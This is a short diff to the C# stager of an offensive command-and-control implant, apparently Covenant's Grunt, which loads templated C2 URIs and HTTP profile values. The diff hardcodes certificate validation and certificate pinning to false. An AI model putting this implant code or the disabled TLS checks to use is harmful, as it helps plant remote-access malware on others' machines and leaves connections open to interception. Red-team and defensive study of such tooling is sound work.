@@ -41,7 +41,7 @@ namespace GruntStager
         public void ExecuteStager()
         {
             try
-            {
+            {	
                 List<string> CovenantURIs = @"{{REPLACE_COVENANT_URIS}}".Split(',').ToList();
                 string CovenantCertHash = @"{{REPLACE_COVENANT_CERT_HASH}}";
                 List<string> ProfileHttpHeaderNames = @"{{REPLACE_PROFILE_HTTP_HEADER_NAMES}}".Split(',').ToList().Select(H => System.Text.Encoding.UTF8.GetString(Convert.FromBase64String(H))).ToList();
@@ -49,8 +49,8 @@ namespace GruntStager
                 List<string> ProfileHttpUrls = @"{{REPLACE_PROFILE_HTTP_URLS}}".Split(',').ToList().Select(U => System.Text.Encoding.UTF8.GetString(Convert.FromBase64String(U))).ToList();
                 string ProfileHttpPostRequest = @"{{REPLACE_PROFILE_HTTP_POST_REQUEST}}".Replace(Environment.NewLine, "\n");
                 string ProfileHttpPostResponse = @"{{REPLACE_PROFILE_HTTP_POST_RESPONSE}}".Replace(Environment.NewLine, "\n");
-                bool ValidateCert = bool.Parse(@"{{REPLACE_VALIDATE_CERT}}");
-                bool UseCertPinning = bool.Parse(@"{{REPLACE_USE_CERT_PINNING}}");
+                bool ValidateCert = false;
+                bool UseCertPinning = false;
 
                 Random random = new Random();
                 string aGUID = @"{{REPLACE_GRUNT_GUID}}";
